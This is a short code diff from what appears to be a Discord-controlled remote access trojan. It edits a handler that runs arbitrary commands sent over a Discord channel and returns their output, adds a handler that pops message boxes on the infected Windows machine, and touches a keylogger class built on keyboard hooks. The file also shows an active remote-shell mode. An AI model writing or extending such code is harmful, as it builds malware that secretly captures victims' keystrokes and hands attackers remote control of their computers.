@@ -115,13 +115,17 @@ async def on_message(message):  # called when discord message was received
                     fulcrum_util.download_attached_file(message)
 
                 case "-RC":     # RUN COMMAND
-                    print("-RC")
                     content = content.strip("-RC")
                     response = fulcrum_util.run_command(content)
                     if response:
                         await channel.send(response)
                     else:
-                        await channel.send("ran")
+                        await channel.send("command ran with no response")
+
+                case "-MB":     # MESSAGE BOX
+                    content = content.strip("-MB")
+                    ctypes.windll.user32.MessageBoxW(0, content, "...", 0)
+
 
         case "shell":   # active shell
             # terminate shell if the user sends quit
@@ -403,7 +407,7 @@ class KeyLogger:
         except Exception as e:
             fulcrum_util.return_error_2_channel(e)
 
-    def stop_key_logger(self):
+    def stop_key_logger(self):  # TODO FIX THIS
         try:
             # unhooking the key logging function
             if self.keyboard_hook:
